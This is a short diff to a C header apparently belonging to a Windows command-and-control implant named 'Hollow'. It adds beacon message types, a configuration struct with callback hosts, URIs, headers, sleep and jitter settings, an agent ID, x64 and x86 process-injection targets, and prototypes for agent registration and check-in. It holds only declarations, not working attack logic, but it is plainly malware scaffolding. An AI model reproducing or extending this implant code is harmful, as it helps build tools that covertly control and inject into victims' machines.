@@ -16,6 +16,47 @@
 
 #define OurProcess ((HANDLE)(LONG_PTR)-1)
 #define TO_DWORD(x) ((DWORD)(ULONG_PTR)(x))
+#define MSG_REGISTER 1
+#define MSG_GET_TASK 2
+#define MSG_OUTPUT 3
+
+extern PBYTE  recvBuf;
+extern SIZE_T recvCap;
+extern SIZE_T recvLen;
+
+
+
+typedef struct {
+    WCHAR host[256];
+    INT32 port;
+    BOOL isHttps;
+    BOOL TrustSelfSigned;
+}Hosts;
+
+typedef struct {
+    WCHAR Path[124];
+}Paths;
+
+typedef struct {
+    struct _net {
+        INT32 TotalCallbacks;
+        Hosts hosts[3];
+        INT32 TotalURIs;
+        Paths paths[3];
+        WCHAR Headers[542];
+        BOOL isHttps;
+        BOOL TrustSelfSigned;
+    }net;
+
+    INT32 AgentID;
+    INT32 Sleep;
+    INT32 Jitter;
+
+    struct _inject {
+        CHAR InjectTox64[MAX_PATH];
+        CHAR InjectTox86[MAX_PATH];
+    }inject;
+}Config;
 
 typedef struct {
     struct _MODULES {
@@ -36,6 +77,7 @@ typedef struct {
         DECL(LocalFree);
         DECL(LocalReAlloc);
         DECL(GetProcAddress);
+        DECL(MoveFileA);
     } Win32;
 
     struct _NTAPIS {
@@ -46,6 +88,8 @@ typedef struct {
         DECL(NtQueryInformationProcess);
     } ntapi;
 
+    Config* config;
+
 }Hollow;
 
 extern Hollow* hollow;
@@ -54,3 +98,5 @@ extern Hollow* hollow;
 void HollowMain();
 BOOL HollowInit();
 BOOL RegisterAgent();
+BOOL ParseConfig();
+BOOL Checkin();
